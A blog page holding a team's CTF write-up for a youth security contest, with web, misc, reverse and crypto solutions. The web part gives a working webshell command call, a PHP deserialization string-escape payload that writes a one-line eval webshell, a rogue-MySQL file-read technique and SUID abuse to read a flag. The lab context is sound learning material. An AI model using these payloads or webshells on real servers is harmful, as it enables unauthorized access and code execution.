@@ -1,0 +1,754 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <title>Writeup | huanghunr&#39;s Blog</title>
+    <meta name="author" content="huanghunr" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+    <!-- <canvas id="background" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+    <script src="/js/background.js"></script> -->
+    <canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas>
+    <script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+    <script src="/js/fireworks.js"></script>
+    <div id="cursor"></div>
+    <link rel="stylesheet" href="/css/cursor.min.css">
+    <script src="/js/cursor.min.js"></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>HUANGHUNR&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-home fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于huanghunr</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;全部文章(搜索)</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;HUANGHUNR&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-home fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于huanghunr</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">全部文章(搜索)</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>Writeup</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/11/24
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Writeup/" style="color: #00bcd4">
+                    Writeup
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    
+    <div class="content" v-pre>
+        <div class="toc">
+
+<!-- toc -->
+
+<ul>
+<li><a href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9D%92%E5%B0%91%E5%B9%B4%E7%BB%84">强网杯 青少年组</a></li>
+<li><a href="#%E8%B5%9B%E4%BA%8B%E4%BF%A1%E6%81%AF">赛事信息</a></li>
+<li><a href="#%E5%90%88%E4%BD%9C%E8%A7%84%E8%8C%83">合作规范</a></li>
+<li><a href="#%E8%B5%9B%E9%A2%98%E5%88%97%E8%A1%A8">赛题列表：</a><ul>
+<li><a href="#web">Web：</a><ul>
+<li><a href="#ezfindshell-solved-working-void2eye">ezFindshell ｜ SOLVED ｜ Working: void2eye</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-mysqlprobe-solved-working-asal1n">题目名称 mysqlprobe｜ SOLVED ｜ Working: AsaL1n</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-ezgetflag-solved-working-asal1n">题目名称 ezgetflag｜ SOLVED ｜ Working: AsaL1n</a></li>
+</ul>
+</li>
+<li><a href="#misc">Misc：</a><ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E7%AD%BE%E5%88%B0-solved-workinglunatic">题目名称 签到｜ SOLVED ｜ Working:Lunatic</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-whitepic-solved-working%E6%B8%A9%E5%A9%B3%E9%9C%82">题目名称 whitepic｜ SOLVED ｜ Working:温婳霂</a></li>
+<li><a href="#%E5%88%A0%E9%99%A4%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B72-solved-working-void2eye">删除后门用户2 ｜ SOLVED ｜ Working: void2eye</a></li>
+</ul>
+</li>
+<li><a href="#reverse">Reverse：</a><ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-entergame-open-working">题目名称 EnterGame｜ OPEN ｜ Working:</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-flip_over-open-working">题目名称 Flip_over ｜ OPEN ｜ Working:</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-open-working">题目名称 ｜ OPEN ｜ Working:</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto：</a><ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-classics-solved-workinglunatic">题目名称 Classics｜ SOLVED ｜ Working:Lunatic</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-alice-aes-solved-workinglunatic">题目名称 Alice-AES｜ SOLVED ｜ Working:Lunatic</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-solved-workingx1ao">题目名称 ｜ SOLVED ｜ Working:X1ao</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn：</a><ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-open-working-1">题目名称 ｜ OPEN ｜ Working:</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-open-working-2">题目名称 ｜ OPEN ｜ Working:</a></li>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-open-working-3">题目名称 ｜ OPEN ｜ Working:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+</div>
+
+<h1><span id="强网杯-青少年组">强网杯 青少年组</span></h1><h1><span id="赛事信息">赛事信息</span></h1><p>:::tip</p>
+<ul>
+<li>比赛地址：</li>
+<li>比赛时间：</li>
+</ul>
+<p>:::</p>
+<h1><span id="合作规范">合作规范</span></h1><p>:::info</p>
+<ul>
+<li>题目格式： 题目名称 ｜ 题目状态 ｜ Working:<ul>
+<li>题目状态：<ul>
+<li>OPEN - 正在试图解这道题</li>
+<li>CLOSED - 解题过程已停滞</li>
+<li>SOLVED - 已解出</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Tips：<ul>
+<li>不要只顾一人做题，不看文档，不写文档</li>
+<li>解一道题，不管这题是否解出，请把你的名字加入到 Working 列表</li>
+<li>如果你卡住了，或者解出这题，先把进展或题解写到文档里再做下一题<ul>
+<li>如果已解决的题目有别的方法，同样把 WriteUp 写在文档里</li>
+</ul>
+</li>
+<li>比赛需要的是团队合作，请看重文档工作，这对大家都有帮助</li>
+<li><strong>比赛结束后请将 WriteUp 补充完整，方便队内整理</strong></li>
+</ul>
+</li>
+</ul>
+<p>:::</p>
+<hr>
+<h1><span id="赛题列表">赛题列表：</span></h1><h2><span id="web">Web：</span></h2><h3><span id="ezfindshell-solved-working-void2eye">ezFindshell ｜ SOLVED ｜ Working: void2eye</span></h3><p>解压直接拖进D盾(一个可以搜索恶意代码的软件)，</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/2971d775-77cb-4938-af6d-b9ea109dc29e.png"></p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/f0779640-1df4-43aa-9296-3bea352e77a8.png"></p>
+<p>找到这个🐎(当时看着这个马比较特殊，短一点)，看了一下代码，搜索了一下array_filter函数array_filter会把第一个参数传给第二个回调函数</p>
+<p>那我们，直接e传system，POST传命令就行了（刚开始想着用数组，然后就是不行，后面去网上了解了一下，不能传数组POST[]&#x3D;，system只接受字符串为参数）</p>
+<pre><code class="python">http://eci-2ze8bl8akx798ccjg3g3.cloudeci1.ichunqiu.com/1de9d9a55a824f4f8b6f37af76596baa.php?e=c3lzdGVt
+POST=cat /flag
+</code></pre>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/8e949157-4915-4d6b-a224-67595a40cc1c.png"></p>
+<h3><span id="题目名称-mysqlprobe-solved-working-asal1n">题目名称 mysqlprobe｜ SOLVED ｜ Working: AsaL1n</span></h3><p>一个连接mysql的网站，想到可以用fakemysql load data 读文件(客户端，在连接MySQL的时候，基本上在连接成功之后都会发出一些SELECT语句来查询一些版本号、编码之类的数据，这时就可以回复一个 file-transfer 请求，这样我们就可以用load data local infile去读取客户端上的文件，我们只要在本地起一个带有读文件补丁的mysql服务，让客户端访问就可以读取文件了) 读取到index.php</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/6e04d434-e111-4c15-93f6-33eda06b6590.png"></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class Mysql &#123;
+    public $debug = 1;
+    public $database;
+    public $hostname;
+    public $port;
+    public $charset = &quot;utf8&quot;;
+    public $username;
+    public $password;
+    public function __construct($database, $hostname, $port, $username, $password) &#123;
+        $this-&gt;database = $database;
+        $this-&gt;hostname = $hostname;
+        $this-&gt;port = $port;
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    &#125;
+    protected function connect() &#123;
+        $dsn = &quot;mysql:host=&quot;.$this-&gt;hostname.&quot;;port=&quot;.$this-&gt;port.&quot;;dbname=&quot;.$this-&gt;database.&quot;;charset=&quot;.$this-&gt;charset;
+        try &#123;
+            $this-&gt;pdo = new PDO($dsn, $this-&gt;username, $this-&gt;password, array(
+                PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true
+            ));
+            $this-&gt;pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+            if ($this-&gt;debug) &#123;
+                echo &quot;&lt;script&gt;showAlert(&#39;Connection Successful!&#39;);&lt;/script&gt;&quot;;
+                $this-&gt;query(&quot;select flag from flag&quot;);
+
+            &#125;
+        &#125; catch (PDOException $e) &#123;
+            if ($this-&gt;debug) &#123;
+                echo &quot;&lt;script&gt;showAlert(&#39;Connection Failed: &quot; . addslashes($e-&gt;getMessage()) . &quot;&#39;);&lt;/script&gt;&quot;;
+            &#125;
+
+        &#125;
+    &#125;
+    public function query($sql) &#123;
+        return $this-&gt;pdo-&gt;query($sql);
+    &#125;
+    public function __destruct()
+    &#123;
+        $this-&gt;connect();
+    &#125;
+&#125;
+class Backdooor&#123;
+    public $cmd;
+    public function __toString()&#123;
+        exec($this-&gt;cmd);
+        return &#39;&#39;;
+    &#125;
+&#125;
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) &#123;
+    $host = $_POST[&#39;host&#39;];
+    $username = $_POST[&#39;username&#39;];
+    $password = $_POST[&#39;password&#39;];
+    $database = $_POST[&#39;database&#39;];
+    $port = intval($_POST[&#39;port&#39;]);
+    $mysql = new Mysql($database, $host, $port, $username, $password);
+    $mysqlser = serialize($mysql);
+    $mysqlser = str_replace(&quot;flag&quot;, &quot;&quot;, $mysqlser);
+    unserialize($mysqlser);
+&#125;
+?&gt;
+</code></pre>
+<p>替换了flag这个字符串<br>存在反序列化字符串逃逸 一次逃逸四个字符，我们只需要在后面构造我们要的</p>
+<p>可以在 <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/2b3eac24-8412-4a73-8d20-d00bba90cda0.png"></p>
+<p>存在字符串拼接触发tostring</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/30e6fd69-e42c-439a-9d0e-f6957bb5b38f.png"></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class Mysql &#123;
+    public $debug = 1;
+    public $database;
+    public $hostname;
+    public $port;
+    public $charset = &quot;utf8&quot;;
+    public $username;
+    public $password;
+    public function __construct($database, $hostname, $port, $username, $password) &#123;
+        $this-&gt;database = $database;
+        $this-&gt;hostname = $hostname;
+        $this-&gt;port = $port;
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    &#125;
+    protected function connect() &#123;
+//        echo $this-&gt;hostname;
+//        echo $this-&gt;password;
+        $dsn = &quot;mysql:host=&quot;.$this-&gt;hostname.&quot;;port=&quot;.$this-&gt;port.&quot;;dbname=&quot;.$this-&gt;database.&quot;;charset=&quot;.$this-&gt;charset;
+//        echo $dsn;
+        try &#123;
+            $this-&gt;pdo = new PDO($dsn, $this-&gt;username, $this-&gt;password, array(
+                PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true
+            ));
+            $this-&gt;pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+            if ($this-&gt;debug) &#123;
+                echo &quot;&lt;script&gt;showAlert(&#39;Connection Successful!&#39;);&lt;/script&gt;&quot;;
+                $this-&gt;query(&quot;select flag from flag&quot;);
+
+            &#125;
+        &#125; catch (PDOException $e) &#123;
+            if ($this-&gt;debug) &#123;
+                echo &quot;&lt;script&gt;showAlert(&#39;Connection Failed: &quot; . addslashes($e-&gt;getMessage()) . &quot;&#39;);&lt;/script&gt;&quot;;
+            &#125;
+
+        &#125;
+    &#125;
+//    public function query($sql) &#123;
+//        return $this-&gt;pdo-&gt;query($sql);
+//    &#125;
+    public function __destruct()
+    &#123;
+        $this-&gt;connect();
+    &#125;
+&#125;
+class Backdooor&#123;
+    public $cmd;
+    public function __toString()&#123;
+//        exec($this-&gt;cmd);
+        echo &quot;\n\n&quot;.$this-&gt;cmd;
+        return &#39;&#39;;
+    &#125;
+&#125;
+$payload= new Backdooor();
+$payload-&gt;cmd=&quot;echo \&#39;&lt;?php @eval(\$_POST[1]); ?&gt;\&#39; &gt; 1.php &quot;;
+echo serialize($payload);
+    $host = &quot;1&quot;;
+    $username = &quot;flagflagflagflagflagflag&quot;;
+    $password = &#39;1&quot;;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:42:&quot;echo \&#39;&lt;?php @eval($_POST[1]); ?&gt;\&#39; &gt; 1.php &quot;;&#125;&#39;;  //;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;111&quot;;&#125;
+//&quot;;s:8:&quot;password&quot;;s:1:&quot;
+
+    $database = &quot;1&quot;;
+    $port = 1;
+    $mysql = new Mysql($database, $host, $port, $username, $password);
+    $mysqlser = serialize($mysql);
+//    echo $mysqlser;
+    $mysqlser = str_replace(&quot;flag&quot;, &quot;&quot;, $mysqlser);
+    echo $mysqlser;
+    unserialize($mysqlser);
+//O:5:&quot;Mysql&quot;:7:&#123;s:5:&quot;debug&quot;;i:1;s:8:&quot;database&quot;;s:1:&quot;1&quot;;s:8:&quot;hostname&quot;;s:1:&quot;1&quot;;s:4:&quot;port&quot;;i:1;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;
+//O:5:&quot;Mysql&quot;:7:&#123;s:5:&quot;debug&quot;;i:1;s:8:&quot;database&quot;;s:1:&quot;1&quot;;s:8:&quot;hostname&quot;;s:1:&quot;1&quot;;s:4:&quot;port&quot;;i:1;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:56:&quot;;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;111&quot;;&#125;&quot;;&#125;
+//O:5:&quot;Mysql&quot;:7:&#123;s:5:&quot;debug&quot;;i:1;s:8:&quot;database&quot;;s:1:&quot;1&quot;;s:8:&quot;hostname&quot;;s:1:&quot;1&quot;;s:4:&quot;port&quot;;i:1;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:69:&quot;;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:15:&quot;system(&#39;calc&#39;);&quot;;&#125;&quot;;&#125;
+//O:5:&quot;Mysql&quot;:7:&#123;s:5:&quot;debug&quot;;i:1;s:8:&quot;database&quot;;s:1:&quot;1&quot;;s:8:&quot;hostname&quot;;s:1:&quot;1&quot;;s:4:&quot;port&quot;;i:1;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:70:&quot;&quot;;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:15:&quot;system(&#39;calc&#39;);&quot;;&#125;&quot;;&#125;
+//O:5:&quot;Mysql&quot;:7:&#123;s:5:&quot;debug&quot;;i:1;s:8:&quot;database&quot;;s:1:&quot;1&quot;;s:8:&quot;hostname&quot;;s:1:&quot;1&quot;;s:4:&quot;port&quot;;i:1;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:71:&quot;1&quot;;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:15:&quot;system(&#39;calc&#39;);&quot;;&#125;&quot;;&#125;
+//
+//O:5:&quot;Mysql&quot;:7:&#123;s:5:&quot;debug&quot;;i:1;s:8:&quot;database&quot;;s:1:&quot;1&quot;;s:8:&quot;hostname&quot;;s:1:&quot;1&quot;;s:4:&quot;port&quot;;i:1;s:7:&quot;charset&quot;;s:4:&quot;utf8&quot;;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;111&quot;;&#125;&#125;
+//
+
+
+//O:9:&quot;Backdooor&quot;:1:&#123;s:3:&quot;cmd&quot;;s:3:&quot;111&quot;;&#125;
+?&gt;
+</code></pre>
+<p>成功写入一句话</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/60ac9f5a-a831-48da-9d3d-4dcdd355773b.png"></p>
+<p>diff存在s位 得到flag</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/86a47f34-8c2f-484c-a83b-889568a80759.png"></p>
+<h3><span id="题目名称-ezgetflag-solved-working-asal1n">题目名称 ezgetflag｜ SOLVED ｜ Working: AsaL1n</span></h3><p>POST 访问的得到flag</p>
+<p>\</p>
+<h2><span id="misc">Misc：</span></h2><h3><span id="题目名称-签到-solved-workinglunatic">题目名称 签到｜ SOLVED ｜ Working:Lunatic</span></h3><p>访问容器可以得到一个网页，里面有四个漫画，每个漫画最后一张都是二维码的一部分</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/dd71a86f-5652-48f9-863a-ae6338abd1cd.png"></p>
+<p>截图，然后用PPT拼出完整二维码</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/6ca776cc-6fbc-4c86-b918-d640b7a8b3dd.png"></p>
+<p>扫码即可得到flag：flag{youthful_and_upward}</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/95ec2d45-7c83-4d7e-aec1-8514c6c0a357.png"></p>
+<h3><span id="题目名称-whitepic-solved-working温婳霂">题目名称 whitepic｜ SOLVED ｜ Working:温婳霂</span></h3><p>解压附件得到一个没有后缀的文件，拖进010发现是gif，改后缀，得到一张空白图。</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/438cc56a-110c-4589-b640-d58203e2201d.png" title=" =1887x1099"></p>
+<p>拖进ps发现一共就两帧，第二帧就是flag。</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/367b397b-9046-4e67-9ab4-3d6ad705ff03.png" title=" =2559x1523"></p>
+<h3><span id="删除后门用户2-solved-working-void2eye">删除后门用户2 ｜ SOLVED ｜ Working: void2eye</span></h3><p>直接找恶意进程</p>
+<p>ps -aux</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/96787cad-2075-4fb3-9a7e-58ca788e4595.png"></p>
+<p>发现一个root起的奇怪进程&#x2F;usr&#x2F;bin&#x2F;b</p>
+<p>cat发现是一个循环写后门用户的脚本</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/40a5a362-dcfb-4230-8612-42d6cfc88983.png"></p>
+<p>然后看bashrc定义了sudo kill别名为kill，sudo -l发现是无密码的suid命令，直接把进程kill掉</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/1de1e00b-403f-480d-9783-632a036c5bc7.png"></p>
+<h2><span id="reverse">Reverse：</span></h2><h3><span id="题目名称-entergame-open-working">题目名称 EnterGame｜ OPEN ｜ Working:</span></h3><p>chacha20加密和解密是一个函数，本质就是异或，调试时在内存把密文写回去，最后在判断处查看内存就出了</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/a58534e5-d56c-464d-92fa-b030d21beb00.png"></p>
+<h3><span id="题目名称-flip_over-open-working">题目名称 Flip_over ｜ OPEN ｜ Working:</span></h3><p>看java层主逻辑在validateAndEncrypt()函数里，在so文件里找到这个函数，大概逻辑的是取flagflag这个字符串作为密钥把”a4c3f8927d9b8e6d6e483fa2cd0193b0a6e2f19c8b47d5a8f3c7a91e8d4b9f67”先进行RC4加密再进行DES_ECB加密,最后再与0x21和密后的数据进行异或后，与密文比较。解密时提取数据，把异或逆一下，直接用赛博厨师解密。</p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/4a2f125a-25da-4611-a6ff-39149a471b88.png" title=" =631x349.5"></p>
+<h3><span id="题目名称-open-working">题目名称 ｜ OPEN ｜ Working:</span></h3><h2><span id="crypto">Crypto：</span></h2><h3><span id="题目名称-classics-solved-workinglunatic">题目名称 Classics｜ SOLVED ｜ Working:Lunatic</span></h3><p> <img src="/attachments/4d6be654-6190-4182-ad1d-8572ae2efa35.png">flag{2834d185-a1da-4fb1-8bac-59076eb6a634}</p>
+<h3><span id="题目名称-alice-aes-solved-workinglunatic">题目名称 Alice-AES｜ SOLVED ｜ Working:Lunatic</span></h3><p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/027256e9-835e-40bf-9dec-ff5f464f57d9.png"> <img src="/attachments/8271139e-67df-418d-b99a-9c9d56d24d7c.png"> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/c788d495-b657-4f61-93ac-682efdd4eccc.png"></p>
+<p> <img src="https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/img/772d145b-af58-4e8d-980e-5818ed0aafa6.png">flag{c8a7ba1b-b222-410f-9e41-7053299c15a5}</p>
+<h3><span id="题目名称-solved-workingx1ao">题目名称 ｜ SOLVED ｜ Working:X1ao</span></h3><p>原解密就是一个RAS解密但是key有一个获取方法，枚举了一个范围的数字<br>数字必须是奇数（最低位为 1）。<br>数字的二进制形式中 不能包含连续的 4 个 1 或连续的 4 个 0。<br>然后根据数字的数量对key值进行加减</p>
+<pre><code class="python">from Crypto.Util.number import *
+from gmpy2 import next_prime
+
+def count_valid_binary_strings(l):
+    dp = [&#123;&#125; for _ in range(l + 1)]
+    
+    dp[1] = &#123;0b1: 1&#125;  
+    
+    for length in range(2, l + 1):
+        for last_digits, count in dp[length - 1].items():
+            for next_bit in [0, 1]:
+                new_last_digits = ((last_digits &lt;&lt; 1) | next_bit) &amp; 0b1111  
+                if new_last_digits != 0b1111 and new_last_digits != 0b0000:  
+                    if new_last_digits not in dp[length]:
+                        dp[length][new_last_digits] = 0
+                    dp[length][new_last_digits] += count
+    
+    key = sum(count for last_digits, count in dp[l].items() if last_digits &amp; 0b1 == 1)
+    return key
+
+l = 2331
+
+n=739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059
+c=229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743
+
+key = count_valid_binary_strings(l)
+p=next_prime(key)
+m=pow(c,inverse(65537,p-1),p)
+print(long_to_bytes(m))
+</code></pre>
+<h2><span id="pwn">Pwn：</span></h2><h3><span id="题目名称-open-working">题目名称 ｜ OPEN ｜ Working:</span></h3><p><strong># journey_story</strong></p>
